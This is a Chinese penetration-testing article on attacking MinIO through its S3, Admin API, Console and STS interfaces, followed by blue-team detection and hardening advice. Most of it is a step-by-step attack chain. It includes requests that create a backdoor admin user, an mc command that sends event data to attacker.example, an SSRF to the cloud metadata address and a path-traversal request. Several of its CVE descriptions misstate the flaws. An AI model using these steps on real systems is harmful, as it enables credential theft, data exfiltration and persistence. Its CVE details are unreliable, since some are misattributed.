---
title: "MinIO对象存储管理面打点与Admin_API/STS利用技术"
date: 2026-06-16T20:30:00+08:00
draft: false
weight: 76
description: "围绕 MinIO 的 S3 API 面、Admin API 面、Console 管理面与 STS 临时凭据面，分析打点识别、未认证信息泄露、凭据接管、配置外读、历史 CVE 链与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "对象存储", "MinIO", "S3", "Admin API", "STS"]
---

# MinIO对象存储管理面打点与Admin_API/STS利用技术

`MinIO` 在云原生与私有化部署场景中使用非常广泛，但它并不只是一个"S3 兼容存储"。一个典型生产部署里，MinIO 至少同时暴露了四个不同性质的攻击面：

- **S3 API 面**：兼容 AWS S3 的对象操作入口，默认端口 `9000`
- **Admin API 面**：与 S3 API 共用端口，但路径独立（`/minio/admin/v3/`），用于集群管理、用户管理、配置读写、日志追踪、性能测试
- **Console 面**：独立端口的 Web 管理控制台，默认端口 `9001`，提供登录、Bucket 管理、用户管理、监控面板
- **STS 面**：Security Token Service，与 S3 API 共用端口，用于颁发临时凭据（`AssumeRole`、`AssumeRoleWithWebIdentity`、`AssumeRoleWithLDAP`）

对攻击者来说，MinIO 的价值不在于某个单一漏洞，而在于它把存储数据、集群控制、身份管理与临时凭据颁发集中在同一进程里。一旦 S3 API 对外可达、Console 端口未收口、Admin API 凭据泄露、STS 配置不当，攻击者可以在极短时间内从一次端口探测上升为对整个对象存储生态的接管，甚至拿到云环境元数据。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 MinIO
2. 哪些未认证端点最值得优先探测
3. 如何围绕 Admin API、Console、STS、Bucket Policy 建立权限画像
4. 历史 CVE 链如何从零认证直接打到根凭据
5. 蓝队如何从访问日志、审计日志与指标面识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `:9000/` 或 `:443/` — S3 API 入口
- `:9001/` — Console Web UI
- `/minio/health/live` — 存活探针
- `/minio/health/ready` — 就绪探针
- `/minio/health/cluster` — 集群健康
- `/minio/v2/metrics/node` — 节点 Prometheus 指标
- `/minio/v2/metrics/cluster` — 集群 Prometheus 指标
- `/minio/v2/metrics/resource` — 资源级指标
- `/minio/admin/v3/info` — Admin 集群信息
- `/api/v1/login` — Console 登录
- `/?Action=AssumeRoleWithWebIdentity` — STS 临时凭据

### 0.2 端口与面映射

| 端口 | 服务 | 性质 |
|------|------|------|
| 9000（或 443） | S3 API + Admin API + STS | 数据面 + 管理面 + 凭据面 |
| 9001（或随机） | Console | Web UI + REST API |

需要注意：如果不显式设置 `--console-address`，Console 端口是随机分配的。生产环境通常会固定到 `9001` 并通过反向代理暴露。

---

## 1. 首轮识别：确认目标为 MinIO

### 1.1 健康检查探针

MinIO 的健康检查端点不需要认证，且响应头与响应体都带有明显指纹。

```http
GET /minio/health/live HTTP/1.1
Host: minio.target.example:9000
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Accept-Ranges: bytes
Server: MinIO
X-Minio-Deployment-Id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Date: Mon, 16 Jun 2026 08:00:00 GMT
Content-Length: 0
```

`Server: MinIO` 与 `X-Minio-Deployment-Id` 是直接指纹。

```http
GET /minio/health/ready HTTP/1.1
Host: minio.target.example:9000
```

```http
HTTP/1.1 200 OK
Server: MinIO
Content-Length: 0
```

### 1.2 集群健康端点

```http
GET /minio/health/cluster HTTP/1.1
Host: minio.target.example:9000
```

```json
{
  "status": "OK",
  "numberOfDisks": 16,
  "numberOfDrivesOnline": 16
}
```

这个端点返回集群磁盘数量与在线状态，可以直接确认部署拓扑。

### 1.3 Console 端口探测

```http
GET / HTTP/1.1
Host: minio.target.example:9001
Accept: text/html
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT

<!doctype html><html><head><meta charset="utf-8"><title>MinIO Console</title>...
```

响应体中出现 `MinIO Console` 即为确认。

### 1.4 S3 API 未认证探测

```http
GET / HTTP/1.1
Host: minio.target.example:9000
Accept: application/xml
```

如果未配置匿名访问策略，通常会返回：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied.</Message>
  <Key></Key>
  <BucketName></BucketName>
  <Resource>/</Resource>
  <RequestId>TX0000000000000001</RequestId>
  <HostId></HostId>
</Error>
```

虽然被拒绝，但 XML 格式与 `AccessDenied` 结构本身就是 MinIO/S3 兼容层的指纹。

---

## 2. 未认证端点：零凭据可回收的信息

### 2.1 Prometheus 指标面

MinIO 的指标端点在多数部署中不需要认证（取决于是否配置了 Prometheus 认证）。

```http
GET /minio/v2/metrics/node HTTP/1.1
Host: minio.target.example:9000
Accept: text/plain
```

```text
# HELP minio_node_disk_total_bytes Total disk space on node
# TYPE minio_node_disk_total_bytes gauge
minio_node_disk_total_bytes{disk="/data1",pool="0",set="0"} 1099511627776
# HELP minio_node_file_descriptor_open_total Total open file descriptors on node
# TYPE minio_node_file_descriptor_open_total gauge
minio_node_file_descriptor_open_total 2048
# HELP minio_node_go_routine_count Total number of go routines
# TYPE minio_node_go_routine_count gauge
minio_node_go_routine_count 1847
# HELP minio_process_cpu_total_seconds Total CPU time consumed on node
# TYPE minio_process_cpu_total_seconds counter
minio_process_cpu_total_seconds 847291.23
# HELP minio_s3_requests_total Total number of S3 requests
# TYPE minio_s3_requests_total counter
minio_s3_requests_total{api="PutObject"} 284719
minio_s3_requests_total{api="GetObject"} 1847291
minio_s3_requests_total{api="ListBuckets"} 4729
minio_s3_requests_total{api="DeleteObject"} 93847
```

从指标中可直接回收：

- 磁盘容量与挂载路径（`/data1`）
- 节点数量与池/集合拓扑（`pool="0"`, `set="0"`）
- 文件描述符使用量
- Goroutine 数量
- 各类 S3 API 调用计数（可推断业务使用模式）
- CPU 累计消耗（可推断运行时长）

```http
GET /minio/v2/metrics/cluster HTTP/1.1
Host: minio.target.example:9000
Accept: text/plain
```

```text
# HELP minio_cluster_disk_total_bytes Total disk space in cluster
# TYPE minio_cluster_disk_total_bytes gauge
minio_cluster_disk_total_bytes 4398046511104
# HELP minio_cluster_nodes_online Total number of nodes online
# TYPE minio_cluster_nodes_online gauge
minio_cluster_nodes_online 4
# HELP minio_bucket_usage_total_bytes Total bucket usage in bytes
# TYPE minio_bucket_usage_total_bytes gauge
minio_bucket_usage_total_bytes{bucket="app-logs"} 284719283746
minio_bucket_usage_total_bytes{bucket="user-uploads"} 1847291837462
minio_bucket_usage_total_bytes{bucket="backups"} 948271837462
```

集群级指标直接暴露所有 Bucket 名称与使用量。这等于白送了一份完整的存储资产清单。

### 2.2 CVE-2023-28432：零认证根凭据泄露

这是 MinIO 历史上最严重的漏洞之一。在受影响版本中，`/minio/health/cluster` 端点在携带 `allErasureSets` 查询参数时，会在响应中泄露所有节点的 `secretKey`。

```http
GET /minio/health/cluster?allErasureSets HTTP/1.1
Host: minio.target.example:9000
```

```json
{
  "erasureSets": [
    {
      "sets": [
        {
          "disks": [
            {
              "endpoint": "minio-node-1:9000",
              "state": "ok",
              "uuid": "a1b2c3d4-...",
              "poolIndex": 0,
              "setIndex": 0,
              "diskIndex": 0
            }
          ]
        }
      ],
      "credentials": {
        "accessKey": "minioadmin",
        "secretKey": "minioadmin-secret-key-value-here"
      }
    }
  ]
}
```

响应中的 `credentials` 字段直接包含 `accessKey` 和 `secretKey`。如果目标是默认配置，攻击者无需任何认证即可拿到根凭据，后续可直接接管整个集群。

**利用链**：

1. 探测 `/minio/health/cluster?allErasureSets`
2. 提取 `accessKey` + `secretKey`
3. 使用提取的凭据调用 Admin API
4. 枚举所有 Bucket、用户、策略
5. 下载全部业务数据

### 2.3 STS 端点探测

STS 端点与 S3 API 共用端口，用于颁发临时凭据。

```http
POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15 HTTP/1.1
Host: minio.target.example:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

如果未配置 OIDC Provider，返回：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>InvalidParameterValue</Code>
  <Message>WebIdentityToken is invalid</Message>
</Error>
```

如果已配置但参数缺失，返回：

```xml
<Error>
  <Code>MissingParameter</Code>
  <Message>WebIdentityToken, RoleArn and RoleSessionName are required</Message>
</Error>
```

这些响应可以确认 STS 是否启用以及支持哪些认证方式。

---

## 3. 凭据后：Admin API 面深度利用

### 3.1 Admin API 认证机制

Admin API 使用 AWS Signature V4 签名，但路径前缀为 `/minio/admin/`。一旦拿到有效凭据（无论是根凭据还是具有 admin 策略的用户凭据），即可调用全部管理端点。

使用 `mc` 客户端设置别名：

```bash
mc alias set target https://minio.target.example:9000 ACCESSKEY SECRETKEY
```

### 3.2 集群信息枚举

```http
GET /minio/admin/v3/info HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 Credential=minioadmin/20260616/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-date,Signature=...
X-Amz-Date: 20260616T080000Z
```

```json
{
  "mode": "distributed",
  "domain": ["minio.target.example"],
  "region": "us-east-1",
  "sqsARN": [],
  "deploymentID": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "buckets": {
    "count": 12
  },
  "objects": {
    "count": 284719
  },
  "versions": {
    "count": 584729
  },
  "usage": {
    "totalSize": 4398046511104
  },
  "services": {
    "vault": { "status": "configured" },
    "ldap": { "status": "configured" },
    "audit": { "status": "configured" },
    "notifications": [
      { "type": "webhook", "status": "configured" }
    ]
  },
  "servers": [
    {
      "state": "online",
      "endpoint": "minio-node-1:9000",
      "uptime": 2847192,
      "version": "RELEASE.2026-01-15T00-00-00Z",
      "network": { "minio-node-1:9000": "online" }
    }
  ]
}
```

从 `/info` 可直接回收：

- 部署模式（单机 / 分布式）
- Bucket 数量与对象总数
- 存储总使用量
- 外部服务配置状态（Vault、LDAP、审计、通知）
- 所有节点地址与在线状态
- MinIO 版本号

### 3.3 配置外读

```http
GET /minio/admin/v3/get-config HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
```

```json
{
  "region": { "name": "us-east-1" },
  "storage_class": {
    "standard": { "data": 4, "parity": 4 },
    "rrs": { "data": 2, "parity": 2 }
  },
  "identity_openid": {
    "config_url": "https://keycloak.internal.example:8443/realms/minio/.well-known/openid-configuration",
    "client_id": "minio-app",
    "client_secret": "s3cr3t-cl13nt-k3y",
    "claim_name": "policy",
    "role_policy": "arn:minio:iam:::role/app-role"
  },
  "identity_ldap": {
    "server_addr": "ldap.internal.example:636",
    "server_insecure": "off",
    "lookup_bind_dn": "cn=ldap-reader,ou=service,dc=internal,dc=example",
    "lookup_bind_password": "ldap-r3ad3r-p@ss",
    "user_dn_search_base_dn": "dc=internal,dc=example",
    "user_dn_search_filter": "(uid=%s)"
  },
  "notify_webhook": {
    "primary": {
      "enable": "on",
      "endpoint": "https://webhook.internal.example:8443/events",
      "auth_token": "webhook-bearer-token-value"
    }
  },
  "logger_webhook": {
    "primary": {
      "enable": "on",
      "endpoint": "https://logging.internal.example:8443/audit",
      "auth_token": "audit-webhook-token"
    }
  }
}
```

配置外读的价值极高。一次调用即可回收：

- OIDC `client_secret`
- LDAP `lookup_bind_password`
- Webhook `auth_token`
- 所有外部服务地址（Keycloak、LDAP、Webhook、日志平台）
- 存储类配置

这些凭据往往不只在 MinIO 内部使用——LDAP 绑定密码可能控制整个 AD/LDAP 目录的只读权限，OIDC client_secret 可能被用于伪造任意用户 Token。

### 3.4 用户与策略枚举

```http
GET /minio/admin/v3/list-users HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
```

```json
{
  "accessKey": "app-service-account",
  "policy": "readwrite",
  "status": "enabled"
}
```

```http
GET /minio/admin/v3/list-canned-policies HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
```

```json
[
  { "name": "consoleAdmin", "statements": [...] },
  { "name": "readwrite", "statements": [...] },
  { "name": "readonly", "statements": [...] },
  { "name": "diagnostics", "statements": [...] }
]
```

```http
GET /minio/admin/v3/info-canned-policy?name=readwrite HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
```

```json
{
  "policyName": "readwrite",
  "policy": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "s3:GetObject",
          "s3:PutObject",
          "s3:DeleteObject",
          "s3:ListBucket",
          "s3:ListAllMyBuckets"
        ],
        "Resource": ["arn:aws:s3:::*"]
      }
    ]
  }
}
```

### 3.5 实时请求追踪

Admin API 提供实时请求追踪能力，可以拦截经过 MinIO 的所有 S3 请求。

```http
GET /minio/admin/v3/trace HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
Accept: text/event-stream
```

```text
event: trace
data: {"trace":{"version":"v7","type":"s3","name":"s3:PutObject","time":"2026-06-16T08:15:23.847Z","path":"/user-uploads/2026/06/report.pdf","api":{"name":"PutObject","bucket":"user-uploads","object":"2026/06/report.pdf"},"remoteHost":"10.0.3.47","requestID":"TX84729ABCDEF","duration":2847192,"messageSize":2847192,"error":"","responseCode":200,"callerInfo":{"func":"cmd.object-handlers.go:1847","line":1847}}}

event: trace
data: {"trace":{"version":"v7","type":"s3","name":"s3:GetObject","time":"2026-06-16T08:15:24.129Z","path":"/backups/db/2026-06-16.sql.gz","api":{"name":"GetObject","bucket":"backups","object":"db/2026-06-16.sql.gz"},"remoteHost":"10.0.3.12","requestID":"TX84730GHIJKL","duration":847291,"messageSize":84729100,"error":"","responseCode":200}}
```

追踪数据中可以实时看到：

- 所有 Bucket 名称与对象路径
- 客户端 IP 地址
- 请求类型与响应码
- 请求耗时与数据量
- 备份文件路径（如 `backups/db/2026-06-16.sql.gz`）

### 3.6 服务器日志流

```http
GET /minio/admin/v3/console/log HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
Accept: text/event-stream
```

```text
event: log
data: {"log":{"deploymentid":"a1b2c3d4","level":"INFO","message":"S3 request received","time":"2026-06-16T08:20:00Z","remoteHost":"10.0.3.47","api":"PutObject","bucket":"user-uploads","object":"2026/06/report.pdf","requestID":"TX84729ABCDEF"}}
```

### 3.7 高价值写操作

一旦拥有 admin 权限，以下写操作可建立持久化驻留：

```bash
mc admin user add target backdoor-user 'b@ckd00r-s3cr3t'
mc admin policy attach target consoleAdmin --user=backdoor-user
```

对应 Admin API：

```http
PUT /minio/admin/v3/add-user HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
Content-Type: application/octet-stream

{"accessKey":"backdoor-user","secretKey":"b@ckd00r-s3cr3t"}
```

```http
PUT /minio/admin/v3/set-user-or-group-policy?user=backdoor-user&isGroup=false HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
Content-Type: application/json

{"policyName":"consoleAdmin"}
```

也可以修改通知配置，将事件流导向攻击者控制的 Webhook：

```bash
mc admin config set target notify_webhook:exfil \
  endpoint="https://attacker.example/webhook" \
  auth_token="exfil-token" \
  enable=on
mc admin service restart target
```

### 3.8 服务控制

Admin API 还支持直接停止或重启整个集群：

```bash
mc admin service stop target
mc admin service restart target
mc admin service freeze target
```

对应 API：

```http
POST /minio/admin/v3/service HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
Content-Type: application/json

{"action": "stop"}
```

---

## 4. Console 面利用

### 4.1 登录接口

Console 登录端点在端口 `9001` 上。

```http
POST /api/v1/login HTTP/1.1
Host: minio.target.example:9001
Content-Type: application/json
Connection: close

{"accessKey":"minioadmin","secretKey":"minioadmin"}
```

成功响应：

```http
HTTP/1.1 200 OK
Set-Cookie: token=eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...; Path=/; HttpOnly; SameSite=Strict
Content-Type: application/json

{
  "sessionToken": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...",
  "token": {
    "accessKey": "minioadmin",
    "secretKey": "",
    "sessionToken": "eyJhbGciOiJIUzUxMiIs..."
  }
}
```

### 4.2 Console API 枚举

登录后可通过 Console REST API 执行几乎所有管理操作：

```http
GET /api/v1/admin/info HTTP/1.1
Host: minio.target.example:9001
Cookie: token=eyJhbGciOiJIUzUxMiIs...
```

```http
GET /api/v1/buckets HTTP/1.1
Host: minio.target.example:9001
Cookie: token=eyJhbGciOiJIUzUxMiIs...
```

```json
{
  "buckets": [
    {"name": "app-logs", "size": 284719283746, "objects": 47291},
    {"name": "user-uploads", "size": 1847291837462, "objects": 184729},
    {"name": "backups", "size": 948271837462, "objects": 2847},
    {"name": "internal-config", "size": 847291, "objects": 47}
  ]
}
```

```http
GET /api/v1/admin/users HTTP/1.1
Host: minio.target.example:9001
Cookie: token=eyJhbGciOiJIUzUxMiIs...
```

### 4.3 STS 登录

如果配置了 LDAP 或 OIDC，Console 还支持 STS 登录：

```http
POST /api/v1/login/sts HTTP/1.1
Host: minio.target.example:9001
Content-Type: application/json

{"accessKey":"ldap-user","secretKey":"ldap-password"}
```

---

## 5. STS 临时凭据面利用

### 5.1 AssumeRole

已有 MinIO 凭据的用户可以通过 STS 颁发临时凭据：

```http
POST /?Action=AssumeRole&Version=2011-06-15 HTTP/1.1
Host: minio.target.example:9000
Content-Type: application/x-www-form-urlencoded
Authorization: AWS4-HMAC-SHA256 ...

DurationSeconds=3600
```

```xml
<AssumeRoleResponse>
  <AssumeRoleResult>
    <Credentials>
      <AccessKeyId>EK92TEMPACCESSKEY</AccessKeyId>
      <SecretAccessKey>wJalrXTEMP/wJalrXTEMPSECRETKEY</SecretAccessKey>
      <SessionToken>eyJhbGciOiJIUzUxMiIs...</SessionToken>
      <Expiration>2026-06-16T09:00:00Z</Expiration>
    </Credentials>
  </AssumeRoleResult>
</AssumeRoleResponse>
```

### 5.2 AssumeRoleWithWebIdentity

如果配置了 OIDC，可以使用外部 IdP 颁发的 JWT Token 获取临时凭据：

```http
POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15 HTTP/1.1
Host: minio.target.example:9000
Content-Type: application/x-www-form-urlencoded

WebIdentityToken=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
&RoleArn=arn:minio:iam:::role/app-role
&RoleSessionName=pentest-session-001
&DurationSeconds=3600
```

```xml
<AssumeRoleWithWebIdentityResponse>
  <AssumeRoleWithWebIdentityResult>
    <Credentials>
      <AccessKeyId>EK92WEBTEMPKEY</AccessKeyId>
      <SecretAccessKey>wJalrXWEBTEMPSECRET</SecretAccessKey>
      <SessionToken>eyJhbGciOiJIUzUxMiIs...</SessionToken>
      <Expiration>2026-06-16T09:00:00Z</Expiration>
    </Credentials>
    <SubjectFromWebIdentityToken>user@example.com</SubjectFromWebIdentityToken>
  </AssumeRoleWithWebIdentityResult>
</AssumeRoleWithWebIdentityResponse>
```

如果攻击者拿到了 OIDC `client_secret`（从 Admin API 配置外读中获得），可以构造任意用户的 JWT Token，进而为任意用户颁发 MinIO 临时凭据。

### 5.3 凭据链总结

```
CVE-2023-28432 零认证 → 根凭据
         ↓
Admin API /get-config → OIDC client_secret / LDAP bind password
         ↓
STS AssumeRoleWithWebIdentity → 任意用户临时凭据
         ↓
S3 API → 全量数据读写
```

---

## 6. 历史 CVE 与风险链

### 6.1 CVE-2023-28432：集群健康端点信息泄露

- **影响版本**：RELEASE.2023-02-17T02-11-16Z 之前
- **CVSS**：7.5（High）
- **核心问题**：`/minio/health/cluster?allErasureSets` 在响应中包含 `secretKey`
- **利用条件**：零认证
- **影响**：直接获取根凭据，完全接管集群

### 6.2 CVE-2023-28433：mc 客户端凭据泄露

- **影响版本**：mc RELEASE.2023-02-28T00-12-45Z 之前
- **CVSS**：6.5（Medium）
- **核心问题**：`mc admin alias set` 命令在 shell 历史和进程列表中暴露 secret key
- **利用条件**：需要本地访问或 shell 历史读取权限
- **影响**：凭据从运维终端泄露

### 6.3 CVE-2024-24747：Webhook SSRF

- **影响版本**：RELEASE.2024-01-31T20-20-33Z 之前
- **CVSS**：6.5（Medium）
- **核心问题**：Webhook 通知配置允许指向任意 URL，包括云元数据端点
- **利用条件**：需要 Admin API 权限
- **影响**：SSRF 到 `169.254.169.254`，窃取云环境 IAM 凭据

```bash
mc admin config set target notify_webhook:ssrf \
  endpoint="http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  enable=on
mc admin service restart target
```

### 6.4 CVE-2024-24746：路径穿越与策略绕过

- **影响版本**：RELEASE.2024-01-31T20-20-33Z 之前
- **CVSS**：6.5（Medium）
- **核心问题**：对象路径中的目录穿越序列（`../`）可绕过 Bucket Policy 授权检查
- **利用条件**：需要基本 S3 访问权限
- **影响**：越权访问其他 Bucket 中的对象

```http
GET /allowed-bucket/../../restricted-bucket/secret-document.pdf HTTP/1.1
Host: minio.target.example:9000
Authorization: AWS4-HMAC-SHA256 ...
```

### 6.5 综合风险链

```
端口扫描 → :9000 S3 API + :9001 Console
         ↓
CVE-2023-28432 → 零认证获取根凭据
         ↓
Admin API /info → 集群拓扑、版本号、Bucket 数量
         ↓
Admin API /get-config → OIDC secret / LDAP 密码 / Webhook token
         ↓
Admin API /trace → 实时拦截所有 S3 请求
         ↓
Admin API /list-users + /info-canned-policy → 全量用户与策略画像
         ↓
CVE-2024-24747 → SSRF 到云元数据，获取云 IAM 凭据
         ↓
CVE-2024-24746 → 路径穿越，越权读取受限 Bucket
         ↓
STS AssumeRoleWithWebIdentity → 为任意用户颁发临时凭据
         ↓
持久化 → 创建后门用户 + 附加 consoleAdmin 策略
```

---

## 7. 蓝队视角：日志痕迹与防守

### 7.1 关键日志源

MinIO 的审计日志与服务器日志是检测打点行为的核心数据源。

**审计日志**（如配置了 `logger_webhook` 或 `audit_kafka`）：

```json
{
  "version": "1",
  "deploymentid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "time": "2026-06-16T08:15:23.847Z",
  "api": {
    "name": "AdminInfo",
    "bucket": "",
    "object": "",
    "status": "OK",
    "statusCode": 200,
    "timeToResponse": "2847ns",
    "callerHost": "10.0.3.47",
    "callerPort": 48291
  },
  "remotehost": "10.0.3.47",
  "requestID": "TX84729ABCDEF",
  "userAgent": "mc/RELEASE.2026-01-15T00-00-00Z",
  "requestHeader": {
    "Authorization": ["AWS4-HMAC-SHA256 ..."],
    "User-Agent": ["mc/RELEASE.2026-01-15T00-00-00Z"]
  }
}
```

### 7.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 未认证访问 `/minio/health/cluster?allErasureSets` | 异常查询参数 + 200 响应 | 严重 |
| Admin API 调用（`/minio/admin/v3/info`） | API 名称为 `Admin*` | 高 |
| 配置外读（`/minio/admin/v3/get-config`） | API 名称为 `GetConfig` | 严重 |
| 实时追踪开启（`/minio/admin/v3/trace`） | 长连接 + SSE 流 | 严重 |
| 用户创建（`/minio/admin/v3/add-user`） | API 名称为 `AddUser` | 严重 |
| 策略绑定（`/minio/admin/v3/set-user-or-group-policy`） | API 名称为 `SetUserOrGroupPolicy` | 严重 |
| 服务停止/重启（`/minio/admin/v3/service`） | API 名称为 `ServiceAction` | 严重 |
| STS 临时凭据颁发 | API 名称为 `AssumeRole*` | 中 |
| 非预期来源的 Console 登录 | `/api/v1/login` 来自外部 IP | 高 |

### 7.3 指标面异常

```text
# 短时间内出现大量 Admin API 调用
minio_s3_requests_total{api="AdminInfo"} 847
minio_s3_requests_total{api="GetConfig"} 12
minio_s3_requests_total{api="ListUsers"} 23
minio_s3_requests_total{api="AddUser"} 3

# 异常来源 IP 的 S3 请求
minio_s3_requests_total{remoteHost="203.0.113.47"} 284719
```

### 7.4 网络层防护

- Admin API 路径 `/minio/admin/` 应在网络层限制为仅允许运维网段访问
- Console 端口 `9001` 不应直接暴露到公网，应通过 VPN 或跳板机访问
- `/minio/health/cluster` 端点应限制为集群内部节点间通信
- Prometheus 指标端点 `/minio/v2/metrics/` 应限制为监控系统网段
- 使用 TLS 加密所有 API 流量
- 定期轮换根凭据与所有用户凭据

### 7.5 配置加固

- 升级 MinIO 到最新 RELEASE，修复所有已知 CVE
- 禁用或限制 STS 端点的来源 IP
- 为所有用户配置最小权限策略，不使用通配符 `arn:aws:s3:::*`
- 启用审计日志并推送到不可篡改的存储
- 配置 Bucket Versioning 防止数据被恶意删除
- 使用 KMS（外部 Vault 或 MinIO 内置 KES）加密服务端加密密钥

---

## 8. 审查清单

| 检查项 | 说明 |
|--------|------|
| S3 API 端口是否对外可达 | 确认 `:9000` 或 `:443` 的可达范围 |
| Console 端口是否对外暴露 | 确认 `:9001` 是否可从外部访问 |
| 健康端点是否可匿名访问 | 测试 `/minio/health/cluster?allErasureSets` |
| Prometheus 指标是否需认证 | 测试 `/minio/v2/metrics/node` |
| 根凭据是否为默认值 | 检查 `minioadmin` / `minioadmin` |
| Admin API 来源是否受限 | 确认 `/minio/admin/` 路径的网络 ACL |
| STS 是否启用且来源不受限 | 检查 `AssumeRole*` 端点可达性 |
| OIDC client_secret 是否已泄露 | 审查 `/get-config` 返回的凭据 |
| LDAP bind password 复杂度 | 审查配置中的 LDAP 绑定凭据 |
| 审计日志是否启用 | 确认 `logger_webhook` 或 `audit_kafka` 配置 |
| 是否存在通配符策略 | 检查所有策略的 Resource 字段 |
| Bucket Versioning 是否启用 | 防止恶意删除 |
| 服务端加密是否配置 | 确认 SSE-S3 或 SSE-KMS |
| 版本是否已修复已知 CVE | 对比 `/info` 返回的版本号 |

---

## 9. 总结

MinIO 的攻击面价值在于它把存储数据、集群管理、身份控制与临时凭据颁发集中在同一进程。S3 API 端口同时承载 Admin API 与 STS，Console 端口提供完整的 Web 管理面，健康检查与指标端点往往不需要认证。

从攻击者视角看，最高效的路径是：

1. 通过健康检查端点确认目标为 MinIO
2. 利用 CVE-2023-28432 或默认凭据获取根权限
3. 通过 Admin API 枚举集群拓扑、用户、策略与外部服务配置
4. 从配置中回收 OIDC secret、LDAP 密码、Webhook token
5. 通过 STS 为任意用户颁发临时凭据
6. 创建后门用户实现持久化
7. 利用 SSRF 与路径穿越进一步扩展到云环境与跨 Bucket 数据

从防守视角看，核心措施是：

1. 限制所有管理端点的网络可达范围
2. 修复已知 CVE，特别是 CVE-2023-28432
3. 不使用默认凭据，定期轮换所有凭据
4. 启用审计日志并推送到不可篡改存储
5. 最小权限策略，避免通配符 Resource
6. 启用 Bucket Versioning 与服务端加密
